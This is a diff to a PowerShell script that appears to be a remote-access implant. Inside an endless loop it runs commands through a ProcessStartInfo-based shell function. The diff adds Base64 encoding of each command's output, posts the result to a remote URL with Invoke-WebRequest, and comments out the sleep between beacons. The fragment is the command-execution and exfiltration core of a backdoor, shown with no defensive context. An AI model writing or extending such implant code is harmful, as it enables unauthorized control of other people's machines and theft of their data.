@@ -1,5 +1,3 @@
-
-
 function shell($fname, $arg){
     
     $pinfo                        = New-Object System.Diagnostics.ProcessStartInfo
@@ -62,12 +60,15 @@ for (;;){
         foreach ($a in $arguments){ $arg += $a + " " }
 
         $res  = shell $f $arg
+        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($res)
+        $EncodedText =[Convert]::ToBase64String($Bytes)
         # $res  = Encrypt $key $res
-        $data = @{result = "$res"}
+        # $encodedURL = [System.Web.HttpUtility]::UrlEncode($EncodedText) 
+        $data = @{result = "$EncodedText"}
         
         Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST'
         
 
-    sleep $n
+    # sleep $n
     }
 }
